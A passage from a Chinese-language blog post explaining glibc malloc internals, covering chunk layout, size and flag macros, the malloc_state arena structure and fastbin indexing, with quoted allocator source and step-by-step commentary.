+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">      |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="string">      .                                                               .</span></span><br><span class="line"><span class="string">      .                                                               |</span></span><br><span class="line"><span class="string">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">    `foot:&#x27;</span> |             Size of chunk, in bytes                           |</span><br><span class="line">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<h4 id="宏定义"><a href="#宏定义" class="headerlink" title="宏定义"></a>宏定义</h4><h5 id="指针转换"><a href="#指针转换" class="headerlink" title="指针转换"></a>指针转换</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))</span></span><br></pre></td></tr></table></figure>

<p>mem就是数据区,chunk就是malloc_chunk的基地址,两者的关系在图上表示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p>显然mem网上数两个成员就是chunk,这两个成员都是INTERNAL_SIZE_T类型的,在32位平台上分别长4字节,在64位平台上分别长8字节</p>
<h5 id="最小chunk大小"><a href="#最小chunk大小" class="headerlink" title="最小chunk大小"></a>最小chunk大小</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure>

<p><code>offsetof(struct,struct.member);</code>作用是计算member成员在其所在的结构体struct中的偏移量</p>
<p>这表明最小的chunk至少要包含前四个成员,prev_size,size,fd,bk,后面两个可以没有</p>
<h5 id="最小申请的堆内存大小"><a href="#最小申请的堆内存大小" class="headerlink" title="最小申请的堆内存大小"></a>最小申请的堆内存大小</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE                                                                \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span></span><br><span class="line"><span class="meta">                      ~MALLOC_ALIGN_MASK))</span></span><br></pre></td></tr></table></figure>

<h5 id="检查对齐"><a href="#检查对齐" class="headerlink" title="检查对齐"></a>检查对齐</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"><span class="comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> misaligned_chunk(p)                                                    \</span></span><br><span class="line"><span class="meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span></span><br><span class="line"><span class="meta">     MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure>

<h5 id="判断用户请求是否离谱"><a href="#判断用户请求是否离谱" class="headerlink" title="判断用户请求是否离谱"></a>判断用户请求是否离谱</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure>

<h5 id="规范化请求大小"><a href="#规范化请求大小" class="headerlink" title="规范化请求大小"></a>规范化请求大小</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \<span class="comment">//如果用户请求的太小则直接用MINSIZE</span></span></span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)<span class="comment">//否则向上取整到满足对齐要求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure>

<h5 id="设置size最低三位标志位"><a href="#设置size最低三位标志位" class="headerlink" title="设置size最低三位标志位"></a>设置size最低三位标志位</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark a chunk as not being on the main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">   macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">   cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">   people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure>

<h5 id="获取本chunk-size"><a href="#获取本chunk-size" class="headerlink" title="获取本chunk size"></a>获取本chunk size</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>

<p>如果想要获得纯真的size,最低三位应该忽略标志位的影响,因此chunksize中用SIZE_BITS取反得到第三位全是0然后按位与,确保获得的size低三位必为0</p>
<p>而chunksize_nomask就没有忽略,相当于直接区的malloc_struct的第二个成员</p>
<h5 id="使用状态"><a href="#使用状态" class="headerlink" title="使用状态"></a>使用状态</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)                                                               \</span></span><br><span class="line"><span class="meta">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse(p)                                                           \</span></span><br><span class="line"><span class="meta">    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size |= PREV_INUSE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)                                                         \</span></span><br><span class="line"><span class="meta">    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span></span><br></pre></td></tr></table></figure>

<h5 id="size大小"><a href="#size大小" class="headerlink" title="size大小"></a>size大小</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="comment">// SIZE_BITS = 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p, s)                                                    \</span></span><br><span class="line"><span class="meta">    ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s) ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)                                                         \</span></span><br><span class="line"><span class="meta">    (((mchunkptr)((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br></pre></td></tr></table></figure>

<p>这里set_foot干了啥?</p>
<p>p是chunk指针,s是该chunk的大小,p+s就指向了本chunk的结尾,</p>
<p>也就是下一个chunk的基地址,也就是下一个chunk的prev_size成员,</p>
<p>于是p+s强转为一个malloc_chunk类型指针,</p>
<p>然后取其第一个成员也就是prev_size,写上本chunk的大小</p>
<h5 id="指定偏移处认为是一个chunk"><a href="#指定偏移处认为是一个chunk" class="headerlink" title="指定偏移处认为是一个chunk"></a>指定偏移处认为是一个chunk</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>

<p>p指针加上s偏移量的地址视为一个chunk的基地址,返回一个malloc_chunk*指针</p>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>分配区结构,一个进程只能有一个主分配区,可以可以有多个非主分配区</p>
<p>当某个线程试图用<code>malloc</code>动态申请内存时,会首先对一个分配区上锁,如果主分配区忙则沿着<code>malloc_state-&gt;next</code>寻找下一个分配区,直到找到一个闲的分配区上锁使用.如果转一圈没发现闲的分配区则创建新的非主分配区,然后将其加入到这个分配区环状链表中上锁使用.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;<span class="comment">//互斥锁,保证临界区只有一个线程访问</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr        top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr        last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr        bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span>     binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">	...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中管理堆块的手段有fastbin,topchunk,unsortedbin,smallbins,largebins这么几种</p>
<p>只考虑单线程的情况,也就是说不会产生非主分配区,只使用主分配区</p>
<p>最初只有很大一块topchunk,刚开始的malloc申请都是直接在malloc上切割使用</p>
<p>free释放时,如果对应堆块落在fastbin范围内则放到fastbin对应的链表中</p>
<p>否则一律放到unsortedbin中,等后面再次malloc时切割或者合并或者分拣</p>
<h4 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h4><p>只会使用fd指针的单向链表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">A[&quot;fastbin[x]&quot;]</span><br><span class="line">A--fd--&gt;a--fd--&gt;b--fd--&gt;c</span><br></pre></td></tr></table></figure>



<h5 id="max-fast"><a href="#max-fast" class="headerlink" title="max_fast"></a>max_fast</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((s) == 0)						      \</span></span><br><span class="line"><span class="meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> INTERNAL_SIZE_T global_max_fast;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span></span><br><span class="line"><span class="meta">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span></span><br></pre></td></tr></table></figure>

<p>对于x64平台,SIZE_SZ&#x3D;8,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MALLOC_ALIGNMENT=2*SIZE_SZ=16=0b 10000</span><br><span class="line">MALLOC_ALIGN_MASK=15=0b 1111</span><br><span class="line"> ~MALLOC_ALIGN_MASK=111...111 0000</span><br></pre></td></tr></table></figure>

<p>这个<code>global_max_fast</code>在<code>malloc_init_state</code>时期被初始化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (av == &amp;main_arena)</span><br><span class="line">  set_max_fast (DEFAULT_MXFAST);</span><br><span class="line">  </span><br><span class="line">#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span><br></pre></td></tr></table></figure>

<p>对于<code>x64</code>平台,<code>SIZE_SZ=8</code>,那么<code>DEFAULT_MXFAST=128</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set_max_fast(128):</span><br><span class="line">	  global_max_fast = ((128 + 8) &amp; 111...111 0000))</span><br><span class="line">	  =0b10001000&amp;0b111...111 0000</span><br><span class="line">	  =0b10000000</span><br><span class="line">	  =128</span><br></pre></td></tr></table></figure>

<p>也就是说,<code>nb&lt;=128</code>才可能在fastbin中取堆块</p>
<h5 id="fastbin-index"><a href="#fastbin-index" class="headerlink" title="fastbin_index"></a>fastbin_index</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz)  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure>

<p>在x64平台上,<code>SIZE_SZ=8</code>,而在x86平台上<code>SIZE_SZ=4</code></p>
<p>如果在x64平台上,则将sz右移4位,相当于除以16,然后-2,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(sz)</span><br><span class="line">	=sz &gt;&gt; 4 - 2</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>sz</th>
<th>fastbin_index(sz) on x64</th>
</tr>
</thead>
<tbody><tr>
<td><code>[0b100000,0b110000)=[32,48)</code></td>
<td>0</td>
</tr>
<tr>
<td><code>[0b110000,0b1000000)=[48,64)</code></td>
<td>1</td>
</tr>
<tr>
<td><code>[0b1000000,0b1010000)=[64,80)</code></td>
<td>2</td>
</tr>
</tbody></table>
<p>比如用户期望分配0x10大小的空间,那么实际上的堆块大小是32字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(0b100000)</span><br><span class="line">	=0b100000&gt;&gt;4 -2</span><br><span class="line">	=0b10-2</span><br><span class="line">	=0</span><br></pre></td></tr></table></figure>

<h5 id="fastbin-idx"><a href="#fastbin-idx" class="headerlink" title="fastbin[idx]"></a>fastbin[idx]</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>fastbins结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct malloc_chunk *mfastbinptr;</span><br><span class="line">...</span><br><span class="line">struct malloc_state&#123;</span><br><span class="line">	...</span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fastbins是一个链栈,先释放的堆块也会先被再次分配</p>
</blockquote>
<p>也就是说<code>mfastbinptr *fb = &amp;fastbin (av, idx);</code></p>
<p>这栈中的指针变量fb指向桶子头的地址,桶子头指向该桶子中的第一个堆块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">A[&quot;fastbin[x] @malloc_state&quot;]</span><br><span class="line">a2[&quot;1st chunk @heap&quot;]</span><br><span class="line">a1[&quot;2nd chunk @heap&quot;]</span><br><span class="line">a0[&quot;3rd chunk @heap&quot;]</span><br><span class="line">fb[&quot;fb句柄 @stack&quot;]----&gt;A--fd--&gt;a2--fd--&gt;a1--fd--&gt;a0</span><br></pre></td></tr></table></figure>







<h5 id="catomic-compare-and-exchange-val-acq-fb-victim-fd-victim"><a href="#catomic-compare-and-exchange-val-acq-fb-victim-fd-victim" class="headerlink" title="catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)"></a>catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> catomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  atomic_compare_and_exchange_val_acq (mem, newval, oldval)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> atomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123; __typeof (mem) __gmemp = (mem);				      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gret = *__gmemp;				      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gnewval = (newval);			      \</span></span><br><span class="line"><span class="meta">								      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> (__gret == (oldval))					      \</span></span><br><span class="line"><span class="meta">       *__gmemp = __gnewval;					      \</span></span><br><span class="line"><span class="meta">     __gret; &#125;)</span></span><br></pre></td></tr></table></figure>

<p>这个宏的作用是,</p>
<p>原本mem指向的是oldval,现在将oldval作为返回值,然后将men指向newval</p>
<p>放在原文中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim = pp;<span class="comment">//首先执行一次,如果第一次victim为空,说明这个桶子就是空的,也就不能用fastbin进行分配</span></span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">while</span> (</span><br><span class="line">		(pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)</span><br><span class="line">      )!= victim</span><br><span class="line">    <span class="comment">//victim指向链栈顶堆块,把他取下来,把原来的次顶堆块,也就是victim的后继堆块,挂到fb指针上,返回值pp是victim</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>fb这个桶子头原本是指向victim这个堆块的,</p>
<p>现在要让fb指向victim的后继堆块,然后返回victim给pp</p>
<p>显然pp必然等于victim,也就是顶多拿出堆顶来,while就结束了,while只会执行一次</p>
<p>至于为啥要这样写呢?压行</p>
